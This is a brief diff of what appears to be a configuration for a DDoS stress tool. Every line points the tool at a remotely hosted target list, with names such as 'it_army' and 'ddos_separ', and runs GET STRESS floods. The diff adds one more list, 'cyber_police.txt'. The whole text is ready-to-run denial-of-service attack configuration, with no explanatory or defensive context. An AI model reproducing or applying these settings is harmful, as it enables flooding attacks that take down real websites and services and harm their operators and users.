@@ -5,3 +5,4 @@
 -c https://cdn.uashield.cc/sites.txt --http-methods GET STRESS
 -c https://raw.githubusercontent.com/girador/res/main/ddos_separ.txt --http-methods GET STRESS
 -c https://raw.githubusercontent.com/girador/res/main/it_army.txt --http-methods GET STRESS
+-c https://raw.githubusercontent.com/girador/res/main/cyber_police.txt --http-methods GET STRESS
